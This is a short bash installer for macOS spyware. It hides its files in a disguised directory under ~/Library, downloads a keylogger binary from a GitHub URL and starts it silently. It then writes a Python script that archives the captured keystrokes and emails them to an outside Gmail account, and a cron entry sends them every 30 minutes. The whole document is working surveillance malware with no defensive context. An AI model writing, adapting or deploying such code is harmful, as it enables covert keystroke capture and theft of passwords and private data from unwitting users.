#!/bin/bash

# Hidden directory
INSTALL_DIR="$HOME/Library/.SystemPreferences/.-/.../.cache/.sys"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Download keylogger
curl -sLO https://raw.githubusercontent.com/Robber-Baron/koskalak-k/main/koskalak-k
chmod +x koskalak-k

# Create Python email script
cat > send_logs.py << 'EOFPYTHON'
import smtplib, os, tarfile
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from datetime import datetime

SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
SENDER_EMAIL = 'YOUR_EMAIL@gmail.com'
SENDER_PASSWORD = 'YOUR_APP_PASSWORD'
RECEIVER_EMAIL = 'RECEIVING_EMAIL@gmail.com'

log_dir = os.path.expanduser('~/Library/.SystemPreferences/.-/.../.cache/.sys/Data')

if os.path.exists(log_dir):
    tar_name = f'logs_{datetime.now().strftime("%Y%m%d_%H%M%S")}.tar.gz'
    tar_path = f'/tmp/{tar_name}'
    with tarfile.open(tar_path, 'w:gz') as tar:
        tar.add(log_dir, arcname='Data')
    
    msg = MIMEMultipart()
    msg['From'] = SENDER_EMAIL
    msg['To'] = RECEIVER_EMAIL
    msg['Subject'] = f'Update - {datetime.now()}'
    msg.attach(MIMEText('Automated delivery', 'plain'))
    
    with open(tar_path, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename={tar_name}')
    msg.attach(part)
    
    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.send_message(msg)
        server.quit()
        os.remove(tar_path)
    except:
        pass
EOFPYTHON

# Start keylogger
nohup ./koskalak-k > /dev/null 2>&1 &

# Add to crontab (every 30 minutes)
(crontab -l 2>/dev/null; echo "*/30 * * * * /usr/bin/python3 $INSTALL_DIR/send_logs.py") | crontab -
